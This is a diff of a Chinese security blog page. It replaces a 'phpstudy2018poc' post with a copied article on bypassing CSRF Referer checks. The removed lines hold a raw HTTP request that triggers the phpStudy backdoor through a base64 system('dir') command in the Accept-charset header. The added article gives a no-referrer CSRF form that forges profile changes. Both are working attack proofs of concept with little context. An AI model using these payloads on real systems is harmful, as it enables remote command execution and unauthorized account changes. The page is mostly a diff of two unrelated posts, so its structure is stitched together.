@@ -94,17 +94,19 @@
 
 
 
-  <meta name="description" content="GET / HTTP/1.1 Host: xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Languag">
+  <meta name="description" content="目录  正常情况 不正常的情况 添加无Referer标签 自建服务器路径带referer字段名     正常情况#正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。 我之前考虑过的方案：  JS修改Referer，失败 后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败  不正常的情况#不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕">
 <meta property="og:type" content="article">
-<meta property="og:title" content="phpstudy2018poc">
-<meta property="og:url" content="http://yoursite.com/2019/10/12/phpstudy2018poc/index.html">
+<meta property="og:title" content="CSRF绕过Referer校验">
+<meta property="og:url" content="http://yoursite.com/2019/12/11/CSRF绕过Referer校验/index.html">
 <meta property="og:site_name" content="菜鸟博客">
-<meta property="og:description" content="GET / HTTP/1.1 Host: xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Languag">
+<meta property="og:description" content="目录  正常情况 不正常的情况 添加无Referer标签 自建服务器路径带referer字段名     正常情况#正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。 我之前考虑过的方案：  JS修改Referer，失败 后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败  不正常的情况#不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-11T16:02:08.422Z">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png">
+<meta property="og:updated_time" content="2019-12-11T03:27:53.532Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="phpstudy2018poc">
-<meta name="twitter:description" content="GET / HTTP/1.1 Host: xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Languag">
+<meta name="twitter:title" content="CSRF绕过Referer校验">
+<meta name="twitter:description" content="目录  正常情况 不正常的情况 添加无Referer标签 自建服务器路径带referer字段名     正常情况#正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。 我之前考虑过的方案：  JS修改Referer，失败 后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败  不正常的情况#不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕">
+<meta name="twitter:image" content="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png">
 
 
 
@@ -112,7 +114,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/10/12/phpstudy2018poc/">
+  <link rel="canonical" href="http://yoursite.com/2019/12/11/CSRF绕过Referer校验/">
 
 
 
@@ -122,7 +124,7 @@
   };
 </script>
 
-  <title>phpstudy2018poc | 菜鸟博客</title>
+  <title>CSRF绕过Referer校验 | 菜鸟博客</title>
   
 
 
@@ -285,7 +287,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/phpstudy2018poc/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/CSRF绕过Referer校验/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="VegyChick">
@@ -302,7 +304,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">phpstudy2018poc
+          <h1 class="post-title" itemprop="name headline">CSRF绕过Referer校验
 
               
             
@@ -328,7 +330,7 @@
                 
               
 
-              <time title="创建时间：2019-10-12 00:01:06 / 修改时间：00:02:08" itemprop="dateCreated datePublished" datetime="2019-10-12T00:01:06+08:00">2019-10-12</time>
+              <time title="创建时间：2019-12-11 11:26:36 / 修改时间：11:27:53" itemprop="dateCreated datePublished" datetime="2019-12-11T11:26:36+08:00">2019-12-11</time>
             </span>
           
 
@@ -370,15 +372,36 @@
       
 
       
-        <p>GET / HTTP/1.1</p>
-<p>Host: xxx</p>
-<p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</p>
-<p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p>
-<p>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>
-<p>Accept-Encoding: gzip,deflate</p>
-<p>Accept-charset:ZWNobyBzeXN0ZW0oImRpciIpOw==</p>
-<p>Connection: close</p>
-<p>Upgrade-Insecure-Requests: 1</p>
+        <p>目录</p>
+<ul>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#正常情况" target="_blank" rel="noopener">正常情况</a></li>
+<li>不正常的情况<ul>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#添加无referer标签" target="_blank" rel="noopener">添加无Referer标签</a></li>
+<li><a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#自建服务器路径带referer字段名" target="_blank" rel="noopener">自建服务器路径带referer字段名</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况#"></a>正常情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#628046037" target="_blank" rel="noopener">#</a></h1><p>正常的情况下（服务器端校验Referer的代码没毛病），前端是无法绕过的。</p>
+<p>我之前考虑过的方案：</p>
+<ul>
+<li>JS修改Referer，失败</li>
+<li>后端用PHP语言编写发送包，问题是你怎么能跨域拿Cookie，失败</li>
+</ul>
+<h1 id="不正常的情况"><a href="#不正常的情况" class="headerlink" title="不正常的情况#"></a>不正常的情况<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#590862394" target="_blank" rel="noopener">#</a></h1><p>不正常的情况下（服务器端校验Referer的代码有漏洞），前端才能做到绕过，下面介绍几个可能会绕过Referer的案例；</p>
+<h2 id="添加无Referer标签"><a href="#添加无Referer标签" class="headerlink" title="添加无Referer标签#"></a>添加无Referer标签<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3703399181" target="_blank" rel="noopener">#</a></h2><blockquote>
+<p>可以尝试无Referer标签，万一逻辑刚好没判断无Referer的情况呢；</p>
+</blockquote>
+<meta name="referrer" content="never">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Copy&lt;html&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="自建服务器路径带referer字段名"><a href="#自建服务器路径带referer字段名" class="headerlink" title="自建服务器路径带referer字段名#"></a>自建服务器路径带referer字段名<a href="https://www.cnblogs.com/mysticbinary/articles/10471206.html#3302619800" target="_blank" rel="noopener">#</a></h2><blockquote>
+<p>原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含，那就666了；</p>
+</blockquote>
+<p><a href="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1552062/201903/1552062-20190304155740024-1698401706.png" alt="img"></a></p>
+<p>如果文章对你有帮助，可以给文章评论、点推荐哦<br>Github：<a href="https://github.com/Mysticbinary" target="_blank" rel="noopener">https://github.com/Mysticbinary</a><br>微信公众号： <a href="https://www.cnblogs.com/mysticbinary/p/12002297.html" target="_blank" rel="noopener">Mysticbinary</a><br>本文版权归作者所有，欢迎转载，但未经作者同意请保留此段声明，请在文章页面明显位置给出原文链接</p>
+<p>分类: <a href="https://www.cnblogs.com/mysticbinary/category/1422334.html" target="_blank" rel="noopener">JavaScript</a></p>
 
       
     </div>
@@ -409,8 +432,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/10/drozer安装/" rel="next" title="drozer安装">
-                <i class="fa fa-chevron-left"></i> drozer安装
+              <a href="/2019/11/20/透过F5获取服务器真实内网IP技巧/" rel="next" title="透过F5获取服务器真实内网IP技巧">
+                <i class="fa fa-chevron-left"></i> 透过F5获取服务器真实内网IP技巧
               </a>
             
           </div>
@@ -418,10 +441,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/12/ios渗透测试/" rel="prev" title="ios渗透测试">
-                ios渗透测试 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -465,8 +484,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -512,6 +540,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#正常情况"><span class="nav-number">1.</span> <span class="nav-text">正常情况#</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#不正常的情况"><span class="nav-number">2.</span> <span class="nav-text">不正常的情况#</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#添加无Referer标签"><span class="nav-number">2.1.</span> <span class="nav-text">添加无Referer标签#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自建服务器路径带referer字段名"><span class="nav-number">2.2.</span> <span class="nav-text">自建服务器路径带referer字段名#</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
